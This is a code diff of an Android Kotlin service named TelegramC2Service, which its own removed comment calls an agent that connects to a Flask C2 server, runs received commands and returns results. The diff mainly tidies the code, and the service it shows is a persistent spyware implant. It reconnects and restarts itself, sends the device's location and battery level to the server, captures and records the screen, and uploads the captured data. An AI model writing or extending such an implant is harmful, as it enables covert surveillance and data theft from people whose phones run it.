@@ -23,24 +23,14 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
 import java.net.URI
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
-import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.TimeUnit
-import java.util.concurrent.atomic.AtomicLong
 
-/**
- * Socket.IO based agent service. Connects to the Flask C2 server,
- * receives commands, executes them, and returns results.
- */
 class TelegramC2Service : Service() {
 
     companion object {
         private const val TAG = "C2Agent"
         private const val NOTIF_ID = 2
         private const val CHANNEL_ID = "c2agent"
-        private const val FILES_PER_PAGE = 12
         private const val RECONNECT_MS = 5000L
     }
 
@@ -59,19 +49,12 @@ class TelegramC2Service : Service() {
     @Volatile private var projection: MediaProjection? = null
     @Volatile private var captureSession: ScreenCaptureSession? = null
 
-    // Socket.IO
     @Volatile private var socket: Socket? = null
     @Volatile private var connected: Boolean = false
     private var reconnectJob: Job? = null
 
-    // UI state
     @Volatile private var startedAt: Long = System.currentTimeMillis()
     @Volatile private var commandCount: Int = 0
-    @Volatile private var lastError: String = ""
-
-    // Files browser state (kept for internal path reuse)
-    private val pathRegistry = ConcurrentHashMap<String, String>()
-    private val idGen = AtomicLong(1000)
 
     private fun log(msg: String) {
         android.util.Log.i(TAG, msg)
@@ -82,9 +65,7 @@ class TelegramC2Service : Service() {
         super.onCreate()
         log("onCreate deviceId=$deviceId")
         startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-
         startedAt = System.currentTimeMillis()
-
         connectSocket()
         WatchdogReceiver.schedule(this)
     }
@@ -102,7 +83,7 @@ class TelegramC2Service : Service() {
                 initProjectionFromIntent(code, data)
             }
         }
-        if (socket == null || connected.not()) connectSocket()
+        if (socket == null || !connected) connectSocket()
         return START_STICKY
     }
 
@@ -177,7 +158,6 @@ class TelegramC2Service : Service() {
             while (isActive) {
                 try {
                     doConnect()
-                    // wait until disconnected
                     while (isActive && connected) delay(500)
                 } catch (e: Exception) {
                     log("connect error: ${e.message}")
@@ -260,10 +240,10 @@ class TelegramC2Service : Service() {
     private fun sendState() {
         try {
             val bat = batteryPct()
+            val loc = Location.get(this@TelegramC2Service)
             val payload = JSONObject().apply {
                 put("device_id", deviceId)
                 put("battery", bat)
-                val loc = Location.get(this)
                 if (!loc.has("error")) {
                     put("latitude", loc.optDouble("lat"))
                     put("longitude", loc.optDouble("lng"))
@@ -315,7 +295,6 @@ class TelegramC2Service : Service() {
         }
         socket?.emit("result", payload)
 
-        // Auto-upload for base64 payloads
         val b64 = result.optString("data_b64", "")
         if (b64.isNotEmpty()) {
             val category = when (type) {
@@ -336,7 +315,6 @@ class TelegramC2Service : Service() {
             }
         }
 
-        // Also handle screen_record with a file path (no data_b64)
         if (type == "screen_record" && success) {
             val path = result.optString("path", "")
             if (path.isNotEmpty()) {
@@ -400,8 +378,6 @@ class TelegramC2Service : Service() {
             }
         }
     }
-
-    // ---------- Utilities ----------
 
     private fun batteryPct(): Int {
         return try {
